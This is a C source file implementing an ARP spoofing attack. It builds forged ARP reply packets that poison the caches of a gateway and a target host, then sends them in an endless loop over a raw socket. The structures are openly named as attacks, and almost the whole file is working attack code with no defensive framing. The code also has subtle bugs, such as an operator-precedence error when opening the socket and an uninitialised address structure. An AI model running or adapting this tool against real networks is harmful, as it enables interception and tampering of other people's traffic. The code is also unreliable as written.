#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>

typedef struct arpmessage
{
	char dest[6];
	char source[6];
	char etherType[2];
	char hType[2];
	char pType[2];
	char hLen;
	char pLen;
	char oper[2];
	char sha[6];
	char spa[4];
	char tha[6];
	char tpa[4];
}arpmessage;

void constructArpMessage(arpmessage* arp, char* dest, char* source, char* etherType, char* hType, char* pType, char* oper, char* sha, char* spa, char* tha, char* tpa)
{
	memcpy(arp->dest, dest, 6);
	memcpy(arp->source, source, 6);
	memcpy(arp->etherType, etherType, 2);
	memcpy(arp->hType, hType, 2);
	memcpy(arp->pType, pType, 2);
	arp->hLen = 0x06;
	arp->pLen = 0x04;
	memcpy(arp->oper, oper, 2);
	memcpy(arp->sha, sha, 6);
	memcpy(arp->spa, spa, 4);
	memcpy(arp->tha, tha, 6);
	memcpy(arp->tpa, tpa, 4);
	printf("Constructed arp payload.\n");
}

void sendArpPayload(arpmessage* arp)
{
	int sockfd;
       if(sockfd = socket(AF_PACKET, SOCK_RAW, 0) < 0)
       {
	       perror("Failed to open the socket.\n");
       }
       struct sockaddr_ll addr;
       struct ifreq if_idx;
       struct ifreq if_mac;
       char* ifName = "eno1";

       

	memset(&if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx.ifr_name, ifName, 5-1);
	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
	    perror("SIOCGIFINDEX");

	memset(&if_mac, 0, sizeof(struct ifreq));
	strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
		perror("SIOCGIFHWADDR");

	addr.sll_ifindex = if_idx.ifr_ifindex;

	addr.sll_halen = ETH_ALEN;

	if (sendto(sockfd, arp, sizeof(*arp), 0, (struct sockaddr*)&addr, sizeof(addr)) < 0)
	{
		perror("Send failed\n");
		close(sockfd);
		exit(1);
	}
	printf("Send ARP payload.\n");
	close(sockfd);
}
	

int main(int argc, char** argv)
{
	char gatewayMac[6] = {0xa0, 0xb0, 0xc0, 0xd0, 0xe0, 0xf0};
	char targetMac[6] = {0xa0, 0xb0, 0xc0, 0xd0, 0xe0, 0xf0};
	char senderMac[6] = {0xa0, 0xb0, 0xc0, 0xd0, 0xe0, 0xf0}; 
	char gatewayIP[4] = {0xc0, 0xa8, 0x01, 0x01};
	char targetIP[4] = {0xc0, 0xa8, 0x01, 0x02};
	char etherArp[2] = {0x08, 0x06};
	char pType[2] = {0x08, 0x00};
	char hType[2] = {0x00, 0x01};
	char oper[2] = {0x00, 0x02};
	arpmessage gate_arpattack;
	arpmessage target_arpattack;
	constructArpMessage(&gate_arpattack, gatewayMac, senderMac, etherArp, hType, pType, oper, senderMac, targetIP, gatewayMac, gatewayIP);
	constructArpMessage(&target_arpattack, targetMac, senderMac, etherArp, hType, pType, oper, senderMac, gatewayIP, targetMac, targetIP);
	while(1)
	{
		sendArpPayload(&gate_arpattack);
		sendArpPayload(&target_arpattack);
	}
}


